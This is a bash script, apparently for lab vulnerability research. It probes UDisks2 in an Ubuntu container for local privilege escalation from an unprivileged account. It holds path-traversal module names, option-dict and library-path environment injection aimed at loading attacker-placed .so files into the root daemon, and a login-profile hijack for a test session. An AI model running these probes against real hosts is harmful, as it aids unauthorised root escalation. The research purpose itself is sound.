#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/udisks-enable-module-gap.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -euo pipefail

tmp=/tmp/udisks-enable-module-gap
home=/home/selfauth/udisks-enable-module-gap
profile=/home/selfauth/.bash_profile
profile_bak="$tmp/selfauth.bash_profile.bak"
profile_state="$tmp/selfauth.profile.state"
root_marker=/root/udisks_enable_module_gap_root
tmp_marker=/tmp/udisks_enable_module_gap_root

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  if [ -f "$profile_state" ]; then
    if grep -qx present "$profile_state" && [ -f "$profile_bak" ]; then
      cp "$profile_bak" "$profile"
      chown selfauth:selfauth "$profile" 2>/dev/null || true
    else
      rm -f "$profile"
    fi
  fi
  rm -rf "$tmp" "$home" /tmp/libudisks2_gap_evil.so /tmp/libbd_gap_evil.so \
    /tmp/udisks2 "$root_marker" "$tmp_marker"
  systemctl reset-failed udisks2.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$tmp_marker" /tmp/udisks2
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

if id selfauth >/dev/null 2>&1; then
  :
else
  useradd -m -s /bin/bash selfauth
  echo selfauth:selfauth | chpasswd
fi
chown -R selfauth:selfauth "$home"

if [ -e "$profile" ]; then
  cp "$profile" "$profile_bak"
  echo present >"$profile_state"
else
  echo absent >"$profile_state"
fi

call_as_attacker() {
  echo "$ $*"
  runuser -u attacker -- "$@" 2>&1
  echo "rc=$?"
}

call_shell_as_attacker() {
  echo "$ attacker$ $*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  echo "rc=$?"
}

echo "## target/default proof"
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
id selfauth
getent group sudo admin 2>/dev/null || true
echo

echo "## package versions"
for pkg in \
  udisks2 libudisks2-0 libblockdev3 libblockdev-crypto3 libblockdev-fs3 \
  libblockdev-loop3 libblockdev-part3 libblockdev-swap3 libblockdev-mdraid3 \
  libblockdev-nvme3 polkitd dbus systemd
do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>&1 || true
done | sort
echo

echo "## UDisks service and D-Bus activation"
systemctl is-enabled udisks2.service 2>&1 || true
systemctl is-active udisks2.service 2>&1 || true
systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
sed -n '1,80p' /usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service
busctl --system list 2>/dev/null | awk '$1=="org.freedesktop.UDisks2" || $1=="org.freedesktop.PolicyKit1" || $1=="org.freedesktop.login1"'
echo

echo "## UDisks D-Bus policy and polkit action search"
sed -n '1,120p' /usr/share/dbus-1/system.d/org.freedesktop.UDisks2.conf
echo "### polkit module action grep"
grep -R "org.freedesktop.udisks2.*module\|enable-module" -n \
  /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy \
  /etc/polkit-1/rules.d /usr/share/polkit-1/rules.d 2>&1 || true
echo

echo "## Manager method introspection"
busctl --system introspect org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager \
  org.freedesktop.UDisks2.Manager --no-pager 2>&1 | sed -n '1,220p'
echo

echo "## baseline object/interface inventory"
busctl --system tree org.freedesktop.UDisks2 2>&1 | sed -n '1,220p'
echo "### Manager interfaces before EnableModules"
gdbus introspect --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager 2>&1 |
  grep -E '^  interface org\.freedesktop\.UDisks2\.(Manager|Manager\.)' || true
echo

echo "## installed module and libblockdev search paths"
ls -ld /usr/lib/aarch64-linux-gnu /usr/lib/aarch64-linux-gnu/udisks2 \
  /usr/lib/aarch64-linux-gnu/udisks2/modules /tmp /var/tmp /home/attacker 2>&1 || true
find /usr/lib /usr/libexec -path '*udisks2*modules*' -o -name 'libudisks2_*.so' 2>/dev/null |
  sort | sed -n '1,120p'
echo "### libblockdev config"
ls -ld /etc/libblockdev /etc/libblockdev/3 /etc/libblockdev/3/conf.d 2>&1 || true
find /etc/libblockdev -maxdepth 3 -type f -print -exec sed -n '1,120p' {} \; 2>/dev/null
echo "### libblockdev installed plugins"
find /usr/lib/aarch64-linux-gnu -maxdepth 1 -type f \( -name 'libbd_*.so*' -o -name 'libblockdev*.so*' \) |
  sort | sed -n '1,160p'
echo "### libblockdev strings for config boundary"
grep -aoE '[A-Za-z0-9_./:-]*(LIBBLOCKDEV_CONFIG_DIR|/etc/libblockdev/3/conf.d/|libbd_[A-Za-z0-9_./:-]*)' \
  /usr/lib/aarch64-linux-gnu/libblockdev.so.3 2>/dev/null | sort -u | sed -n '1,160p'
echo

echo "## reachability from plain non-sudo attacker"
runuser -u attacker -- id
loginctl user-status attacker 2>&1 | sed -n '1,12p' || true
echo

echo "## EnableModule/EnableModules calls from plain attacker"
set +e
for m in bcache btrfs lvm2 mdraid zram evil evil-name ""; do
  echo "### EnableModule '${m}' true"
  runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/Manager \
    --method org.freedesktop.UDisks2.Manager.EnableModule "$m" true 2>&1
  echo "rc=$?"
done
echo "### EnableModules true"
runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModules true 2>&1
echo "rc=$?"
echo "### EnableModule lvm2 false"
runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModule lvm2 false 2>&1
echo "rc=$?"
set -e
echo

echo "## module-name/path traversal probes"
set +e
for m in "../tmp/evil" "evil/../../tmp/x" "/tmp/evil" "." ".." "evil..name" "evil name" $'evil\nname'; do
  printf "### EnableModule %q true\n" "$m"
  runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/Manager \
    --method org.freedesktop.UDisks2.Manager.EnableModule "$m" true 2>&1
  echo "rc=$?"
done
set -e
echo

echo "## options dict injection probes"
set +e
runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModule evil true "{'module-path': <'/tmp'>}" 2>&1
echo "EnableModule_extra_dict_rc=$?"
runuser -u attacker -- gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModules true "{'module-path': <'/tmp'>}" 2>&1
echo "EnableModules_extra_dict_rc=$?"
set -e
echo

echo "## attacker-controlled module search path and env probes"
runuser -u attacker -- bash -lc '
  set -e
  mkdir -p /tmp/udisks2/modules
  printf "not-a-udisks-module\n" > /tmp/libudisks2_gap_evil.so
  printf "not-a-udisks-module\n" > /tmp/udisks2/modules/libudisks2_gap_evil.so
  printf "not-a-libblockdev-plugin\n" > /tmp/libbd_gap_evil.so
  chmod 755 /tmp/libudisks2_gap_evil.so /tmp/udisks2/modules/libudisks2_gap_evil.so /tmp/libbd_gap_evil.so
  ls -l /tmp/libudisks2_gap_evil.so /tmp/udisks2/modules/libudisks2_gap_evil.so /tmp/libbd_gap_evil.so
'
set +e
runuser -u attacker -- bash -lc \
  'UDISKS_MODULE_DIR=/tmp UDISKS_MODULES_DIR=/tmp/udisks2/modules G_MODULE_PATH=/tmp LD_LIBRARY_PATH=/tmp LIBBLOCKDEV_CONFIG_DIR=/tmp busctl --system call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager org.freedesktop.UDisks2.Manager EnableModule sb gap_evil true' 2>&1
echo "client_env_EnableModule_rc=$?"
set -e
echo "### restart via D-Bus activation with attacker client env"
systemctl stop udisks2.service >/dev/null 2>&1 || true
set +e
runuser -u attacker -- bash -lc \
  'UDISKS_MODULE_DIR=/tmp UDISKS_MODULES_DIR=/tmp/udisks2/modules G_MODULE_PATH=/tmp LD_LIBRARY_PATH=/tmp LIBBLOCKDEV_CONFIG_DIR=/tmp busctl --system call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager org.freedesktop.UDisks2.Manager EnableModule sb gap_evil true' 2>&1
echo "activation_env_EnableModule_rc=$?"
set -e
systemctl is-active udisks2.service 2>&1 || true
ps eww -C udisksd 2>&1 | sed -n '1,8p'
echo

echo "## libblockdev plugin loading confusion checks"
echo "### root service environment after attacker env attempt"
tr '\0' '\n' </proc/"$(pidof udisksd | awk '{print $1}')"/environ 2>/dev/null |
  grep -E 'LIBBLOCKDEV|G_MODULE|UDISKS|LD_LIBRARY|PATH=' || true
echo "### EnableModules true after client LIBBLOCKDEV_CONFIG_DIR=/tmp"
set +e
runuser -u attacker -- bash -lc \
  'LIBBLOCKDEV_CONFIG_DIR=/tmp LD_LIBRARY_PATH=/tmp busctl --system call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager org.freedesktop.UDisks2.Manager EnableModules b true' 2>&1
echo "libblockdev_env_EnableModules_rc=$?"
set -e
echo "### udisks journal module messages"
journalctl -b -u udisks2 --no-pager -n 80 2>&1 |
  grep -E 'gap_evil|Error initializing module|Error loading modules|udisks daemon version|Acquired the name|LIBBLOCKDEV' || true
echo

echo "## subsequent method/interface inventory after EnableModules"
busctl --system tree org.freedesktop.UDisks2 2>&1 | sed -n '1,260p'
echo "### Manager interfaces after EnableModules"
gdbus introspect --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager 2>&1 |
  grep -E '^  interface org\.freedesktop\.UDisks2\.(Manager|Manager\.)' || true
echo "### direct module interface method attempts"
set +e
for iface in org.freedesktop.UDisks2.Manager.BTRFS org.freedesktop.UDisks2.Manager.LVM2 org.freedesktop.UDisks2.Manager.NVMe; do
  echo "### $iface introspect/call"
  busctl --system introspect org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager "$iface" --no-pager 2>&1 | sed -n '1,80p'
done
set -e
echo

echo "## active selfauth comparison"
cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/udisks-enable-module-gap/active-selfauth.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
echo "### active EnableModule gap_evil true"
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModule gap_evil true 2>&1
echo "rc=$?"
echo "### active EnableModules true"
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/Manager \
  --method org.freedesktop.UDisks2.Manager.EnableModules true 2>&1
echo "rc=$?"
SH
chmod 0755 "$home/probe.sh"
chown -R selfauth:selfauth "$home"
cat >"$profile" <<'SH'
/home/selfauth/udisks-enable-module-gap/probe.sh
exit
SH
chown selfauth:selfauth "$profile"
systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 60 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
cat "$tmp/active-selfauth.out" 2>&1 || true
echo

echo "## root proof and cleanup state"
for p in "$root_marker" "$tmp_marker"; do
  if [ -e "$p" ]; then
    echo "ROOT_PROOF_PRESENT $p"
    ls -l "$p"
    cat "$p"
  else
    echo "ROOT_PROOF_ABSENT $p"
  fi
done
systemctl is-active udisks2.service 2>&1 || true
systemctl --failed --no-legend 2>&1 || true
EOS

sed -n '1,420p' "$log"
